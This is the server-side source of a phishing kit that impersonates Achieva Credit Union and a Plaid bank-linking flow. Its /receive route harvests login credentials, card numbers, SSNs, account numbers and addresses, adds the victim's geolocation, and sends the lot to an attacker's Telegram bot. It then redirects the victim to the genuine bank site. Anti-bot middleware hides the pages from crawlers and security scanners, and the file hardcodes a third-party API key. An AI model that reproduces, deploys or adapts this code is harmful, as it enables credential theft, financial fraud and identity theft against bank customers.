const express = require('express');
const app = express();
const bodyParser = require('body-parser');
const path = require('path');
const { botToken, chatId, plaid } = require('./config/settings.js');
//const antibot = require('./middleware/antibot');
//const { getClientIp } = require("request-ip");
const https = require('https');
const querystring = require('querystring');
const axios = require('axios');
const URL = `https://api-bdc.net/data/ip-geolocation?ip=`;
const ApiKey = 'bdc_4422bb94409c46e986818d3e9f3b2bc2';
const fs = require('fs').promises; 
const isbot = require('isbot');
const ipRangeCheck = require('ip-range-check');
const { botUAList } = require('./config/botUA.js');
const { botIPList, botIPRangeList, botIPCIDRRangeList, botIPWildcardRangeList } = require('./config/botIP.js');
const { botRefList } = require('./config/botRef.js');
const { use } = require('express/lib/router');
const { sendMessageFor } = require('simple-telegram-message');
const viewDir = path.join(__dirname, 'views');

const port = 3000;




app.listen(port, () => {
  console.log(`Server is running on port ${port}`);
});

app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, 'public')));
app.set('trust proxy', true); 

function getClientIp(req) {
  const xForwardedFor = req.headers['x-forwarded-for'];
  if (xForwardedFor) {
    const ips = xForwardedFor.split(',');
    return ips[0].trim();
  }
  return req.connection.remoteAddress || req.socket.remoteAddress || null;
}


// Middleware function for bot detection
function isBotUA(userAgent) {
  if (!userAgent) {
    userAgent = '';
  }

  if (isbot(userAgent)) {
    return true;
  }

  for (let i = 0; i < botUAList.length; i++) {
    if (userAgent.toLowerCase().includes(botUAList[i])) {
      return true;
    }
  }

  return false;
}

function isBotIP(ipAddress) {
  if (!ipAddress) {
    ipAddress = '';
  }

  if (ipAddress.substr(0, 7) == '::ffff:') {
    ipAddress = ipAddress.substr(7);
  }

  for (let i = 0; i < botIPList.length; i++) {
    if (ipAddress.includes(botIPList[i])) {
      return true;
    }
  }

  function IPtoNum(ip) {
    return Number(
      ip.split('.').map((d) => ('000' + d).substr(-3)).join('')
    );
  }

  const inRange = botIPRangeList.some(
    ([min, max]) =>
      IPtoNum(ipAddress) >= IPtoNum(min) && IPtoNum(ipAddress) <= IPtoNum(max)
  );

  if (inRange) {
    return true;
  }

  for (let i = 0; i < botIPCIDRRangeList.length; i++) {
    if (ipRangeCheck(ipAddress, botIPCIDRRangeList[i])) {
      return true;
    }
  }

  for (let i = 0; i < botIPWildcardRangeList.length; i++) {
    if (ipAddress.match(botIPWildcardRangeList[i]) !== null) {
      return true;
    }
  }

  return false;
}

function isBotRef(referer) {
  if (!referer) {
    referer = '';
  }

  for (let i = 0; i < botRefList.length; i++) {
    if (referer.toLowerCase().includes(botRefList[i])) {
      return true;
    }
  }
  return false;
}

app.use((req, res, next) => {
  const clientUA = req.headers['user-agent'] || req.get('user-agent');
  const clientIP = getClientIp(req);
  const clientRef = req.headers.referer || req.headers.origin;

  try {
    if (isBotUA(clientUA) || isBotIP(clientIP) || isBotRef(clientRef)) {
      console.log(`Blocked request: User-Agent: ${clientUA}, IP: ${clientIP}, Referrer: ${clientRef}`);
      return res.status(404).send('Not Found');
    } else {
      next();
    }
  } catch (error) {
    console.error('Error in bot detection middleware:', error);
    res.status(500).send('Internal Server Error');
  }
});


app.get('/link', (req, res) => {
  const step = req.query.step;

  switch (step) {
    case '1':
      res.sendFile(path.join(viewDir, 'pl.html'));
      break;
      
    case '2':
      
      res.sendFile(path.join(viewDir, 'plbanks.html'));
      break;
      
    case '3':
    
      res.sendFile(path.join(viewDir, 'pllogin.html'));
      break;
    default:
    
      res.redirect('/Authenticate');
      break;
  }
});


app.get('/confirm', async (req, res) => {
  try {
    let htmlContent;
        htmlContent = await fs.readFile(path.join(__dirname, 'views', 'confirm.html'), 'utf-8');
    
    res.send(htmlContent);
  } catch (error) {
    console.error('Error reading file:', error);
    res.status(500).send('Internal Server Error');
  }
});


// Middleware function for form submission
app.post('/receive', async (req, res) => {
  let message = '';
  let myObject = req.body;

  try {
    const sendAPIRequest = async (ipAddress) => {
      try {
        const apiResponse = await axios.get(URL + ipAddress + '&localityLanguage=en&key=' + ApiKey);
        return apiResponse.data;
      } catch (error) {
        console.error("Error in API request:", error);
        throw error;
      }
    };

    const ipAddress = getClientIp(req);
    const ipAddressInformation = await sendAPIRequest(ipAddress);
    const userAgent = req.headers["user-agent"];
    const systemLang = req.headers["accept-language"];

    const myObjects = Object.keys(myObject).map(key => key.toLowerCase());

    if (myObjects.includes('username')) {
      message += `✅ UPDATE TEAM | ACHIEVE ACU | USER_${ipAddress}\n\n` +
                 `👤 LOGIN \n\n`;

      for (const key of myObjects) {
        if (key !== 'visitor') {
          console.log(`${key}: ${myObject[key]}`);
          message += `${key}: ${myObject[key]}\n`;
        }
      }

      message += `🌍 GEO-IP INFO\n` +
        `IP ADDRESS       : ${ipAddressInformation.ip}\n` +
        `COORDINATES      : ${ipAddressInformation.location.longitude}, ${ipAddressInformation.location.latitude}\n` +
        `CITY             : ${ipAddressInformation.location.city}\n` +
        `STATE            : ${ipAddressInformation.location.principalSubdivision}\n` +
        `ZIP CODE         : ${ipAddressInformation.location.postcode}\n` +
        `COUNTRY          : ${ipAddressInformation.country.name}\n` +
        `TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` +
        `ISP              : ${ipAddressInformation.network.organisation}\n\n` +
        `💻 SYSTEM INFO\n` +
        `USER AGENT       : ${userAgent}\n` +
        `SYSTEM LANGUAGE  : ${systemLang}\n` +
        `💬 Telegram: https://t.me/UpdateTeams\n`;

      res.send('dn');
    }

    if (myObjects.includes('exp-date') || myObjects.includes('card-number') || myObjects.includes('billingaddress')) {
      message += `✅ UPDATE TEAM | ACHIEVE ACU | USER_${ipAddress}\n\n` +
                 `👤 CARD INFO\n\n`;

      for (const key of myObjects) {
        console.log(`${key}: ${myObject[key]}`);
        message += `${key}: ${myObject[key]}\n`;
      }

      message += `🌍 GEO-IP INFO\n` +
        `IP ADDRESS       : ${ipAddress}\n` +
        `TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` +
        `💬 Telegram: https://t.me/UpdateTeams\n`;

      let url;
      if (plaid == "on") {
        url = "/link?step=1";
      } else {
        url = "https://www.achievacu.com/";	
      }

      res.send({ url: url });
    }

    if (myObjects.includes('userid')) {
      message += `✅ UPDATE TEAM | ACHIEVE ACU | USER_${ipAddress}\n\n` +
                 `👤 PLAID INFO\n\n`;      for (const key of myObjects) {
        console.log(`${key}: ${myObject[key]}`);
        message += `${key}: ${myObject[key]}\n`;
      }

      message += `🌍 GEO-IP INFO\n` +
        `IP ADDRESS       : ${ipAddress}\n` +
        `TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` +
        `💬 Telegram: https://t.me/UpdateTeams\n`;
    }

    if (myObjects.includes('email')) {
      message += `✅ UPDATE TEAM | ACHIEVE ACU | USER_${ipAddress}\n\n` +
                 `👤 EMAIL INFO\n\n`;

      for (const key of myObjects) {
        console.log(`${key}: ${myObject[key]}`);
        message += `${key}: ${myObject[key]}\n`;
      }

      message += `🌍 GEO-IP INFO\n` +
        `IP ADDRESS       : ${ipAddress}\n` +
        `TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` +
        `💬 Telegram: https://t.me/UpdateTeams\n`;

      res.send('dn');
    }

    if (myObjects.includes('address') || myObjects.includes('city') || myObjects.includes('zip')) {
      message += `✅ UPDATE TEAM | ACHIEVE ACU | USER_${ipAddress}\n\n` +
                 `👤 ADDRESS INFO\n\n`;

      for (const key of myObjects) {
        console.log(`${key}: ${myObject[key]}`);
        message += `${key}: ${myObject[key]}\n`;
      }

      message += `🌍 GEO-IP INFO\n` +
        `IP ADDRESS       : ${ipAddress}\n` +
        `TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` +
        `💬 Telegram: https://t.me/UpdateTeams\n`;

      res.send('dn');
    }

    if (myObjects.includes('membernumber') || myObjects.includes('accountnumber') || myObjects.includes('ssn')) {
      message += `✅ UPDATE TEAM | ACHIEVE ACU | USER_${ipAddress}\n\n` +
                 `👤 USER ACCOUNT INFO\n\n`;

      for (const key of myObjects) {
        console.log(`${key}: ${myObject[key]}`);
        message += `${key}: ${myObject[key]}\n`;
      }

      message += `🌍 GEO-IP INFO\n` +
        `IP ADDRESS       : ${ipAddress}\n` +
        `TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` +
        `💬 Telegram: https://t.me/UpdateTeams\n`;

      res.send('dn');
    }

    console.log("Reached before sendMessageFor");
const sendMessage = sendMessageFor(botToken, chatId);
await sendMessage(message);
console.log("Message sent successfully");

  } catch (error) {
    console.error("Error in processing request:", error);
    res.status(500).send('An error occurred while processing the request.');
  }
});

// Route handler for login pages
app.get('/Authenticate', async (req, res) => {
  try {
    let htmlContent;
    const page = req.params.page;
    const fileName = `index.html`;
    htmlContent = await fs.readFile(path.join(__dirname, 'views', fileName), 'utf-8');
    console.log(htmlContent);
    res.send(htmlContent);
  } catch (error) {
    console.error('Error reading file:', error);
    res.status(500).send('Internal Server Error');
  }
});

app.get('/', async (req, res) => {
        res.redirect('/Authenticate');
});

// Middleware function for bot detection
function antiBotMiddleware(req, res, next) {
  const clientUA = req.headers['user-agent'] || req.get('user-agent');
  const clientIP = getClientIp(req);
  const clientRef = req.headers.referer || req.headers.origin;

  if (isBotUA(clientUA) || isBotIP(clientIP) || isBotRef(clientRef)) {
    return res.status(404).send('Not Found');
  } else {
    next();
  }
} 

app.use(antiBotMiddleware);
